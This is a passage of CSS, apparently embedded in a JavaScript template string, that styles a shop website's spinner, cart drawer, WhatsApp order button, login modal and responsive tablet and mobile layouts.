    white;

  border-radius: 50%;

  animation:
    spin
    .7s linear
    infinite;
}

@keyframes spin {
  to {
    transform:
      rotate(360deg);
  }
}

.securityText {
  display: block;

  margin-top: 14px;

  color: #a0969a;

  text-align: center;

  font-size: 7px;

  line-height: 1.5;
}


/* ========================= */
/* CART */
/* ========================= */

.cartOverlay {
  position: fixed;

  inset: 0;

  z-index: 9000;

  background:
    rgba(
      30,
      15,
      20,
      .5
    );

  display: flex;

  justify-content: flex-end;
}

.cartDrawer {
  width:
    min(
      430px,
      100%
    );

  height: 100%;

  background: white;

  display: flex;

  flex-direction: column;
}

.cartHeader {
  padding: 20px;

  border-bottom:
    1px solid
    #eee4df;

  display: flex;

  align-items: center;

  justify-content: space-between;
}

.cartHeader h2 {
  margin: 0;

  font-family:
    "Playfair Display",
    serif;
}

.cartHeader small {
  color: #867a80;

  font-size: 8px;
}

.cartHeader button {
  border: 0;

  background: transparent;

  font-size: 22px;
}

.cartContent {
  flex: 1;

  overflow-y: auto;

  padding: 0 20px;
}

.emptyCart {
  margin-top: 100px;

  text-align: center;

  color: #81757b;
}

.emptyCart > span {
  font-size: 40px;
}

.emptyCart h3 {
  font-family:
    "Playfair Display",
    serif;
}

.emptyCart p {
  font-size: 10px;
}

.cartItem {
  padding:
    18px 0;

  display: grid;

  grid-template-columns:
    90px 1fr;

  gap: 14px;

  border-bottom:
    1px solid
    #eee4df;
}

.cartItem img {
  width: 90px;

  height: 120px;

  object-fit: cover;

  border-radius: 8px;

  filter: none;
}

.cartItemContent {
  display: flex;

  flex-direction: column;
}

.cartItem h4 {
  margin:
    0 0 7px;

  font-family:
    "Playfair Display",
    serif;
}

.cartItem strong {
  color: #77364c;

  font-size: 10px;
}

.quantity {
  margin-top: 14px;

  display: flex;

  align-items: center;

  gap: 11px;
}

.quantity button {
  width: 27px;

  height: 27px;

  border:
    1px solid
    #e5dad6;

  border-radius: 50%;

  background: white;
}

.quantity span {
  font-size: 10px;

  font-weight: 700;
}

.remove {
  align-self: flex-start;

  margin-top: auto;

  padding-top: 12px;

  border: 0;

  background: transparent;

  color: #9c5367;

  font-size: 8px;

  text-decoration: underline;
}

.cartFooter {
  padding: 20px;

  border-top:
    1px solid
    #eee4df;
}

.total {
  display: flex;

  justify-content: space-between;
}

.total strong {
  color: #77364c;
}

.whatsappOrder {
  width: 100%;

  height: 50px;

  margin-top: 15px;

  border: 0;

  border-radius: 30px;

  background: #435c4e;

  color: white;

  font-size: 10px;

  font-weight: 700;
}


/* ========================= */
/* TABLET */
/* ========================= */

@media (
  max-width: 1050px
) {
  .products {
    grid-template-columns:
      repeat(
        3,
        1fr
      );
  }
}

@media (
  max-width: 850px
) {
  nav {
    display: none;
  }

  .hero {
    grid-template-columns:
      1fr;
  }

  .heroText {
    text-align: center;
  }

  .heroText > p {
    margin-left: auto;

    margin-right: auto;
  }

  .heroButtons,
  .heroAdvantages {
    justify-content: center;
  }

  .heroVisual {
    width:
      min(
        600px,
        100%
      );

    margin: auto;
  }

  .services {
    margin-left: 20px;

    margin-right: 20px;

    grid-template-columns:
      1fr;
  }

  .services article {
    border-right: 0;

    border-bottom:
      1px solid
      #eee2dc;
  }

  .services article:last-child {
    border-bottom: 0;
  }

  .about {
    grid-template-columns:
      1fr;
  }

  .products {
    grid-template-columns:
      repeat(
        2,
        1fr
      );
  }
}


/* ========================= */
/* MOBILE */
/* ========================= */

@media (
  max-width: 550px
) {
  .topbar {
    font-size: 8px;
  }

  .topbar
  span:last-child,
  .dot {
    display: none;
  }

  .header {
    height: 68px;

    padding:
      0 15px;
  }

  .logo strong {
    font-size: 10px;
  }

  .logout {
    display: none;
  }

  .cartButton {
    width: 42px;

    padding: 0;

    justify-content: center;

    position: relative;
  }

  .cartLabel {
    display: none;
  }

  .cartButton b {
    position: absolute;

    top: -3px;

    right: -3px;

    width: 17px;

    height: 17px;

    background: #a44561;

    color: white;

    border:
      2px solid white;
  }

  .hero {
    padding:
      50px 18px
      70px;
  }

  .hero h1 {
    font-size: 47px;
  }

  .heroText > p {
    font-size: 12px;
  }

  .heroButtons {
    flex-direction: column;
  }

  .heroAdvantages {
    display: grid;
  }

  .heroVisual {
    height: 420px;
  }

  .heroBackground {
    width: 290px;

    height: 290px;

    right: 0;
  }

  .heroMain {
    width: 69%;

    right: 2%;
  }

  .heroSmall {
    width: 35%;

    left: 0;
  }

  .heroCard {
    width: 145px;

    padding: 12px;
  }

  .collection {
    padding:
      75px 12px;
  }

  .collectionTop {
    flex-direction: column;

    align-items: stretch;

    gap: 20px;
  }

  .collection h2 {
    font-size: 38px;
  }

  .searchBox {
    width: 100%;
  }

  .products {
    grid-template-columns:
      repeat(
        2,
        1fr
      );

    gap:
      25px 8px;
  }

  .productImage {
    height: 270px;
  }

  .productInfo h3 {
    font-size: 15px;
  }

  .sizes {
    display: none;
  }

  .addCart {
    height: 35px;

    opacity: 1;

    transform: none;
  }

  .about {
    padding:
      70px 20px;
  }

  .aboutImage {
    height: 420px;
  }

  .about h2 {
    font-size: 45px;
  }

  .loginModal {
    padding:
      32px 20px
      24px;

    border-radius: 18px;
  }

  .loginModal h2 {
    font-size: 25px;
  }
}
`;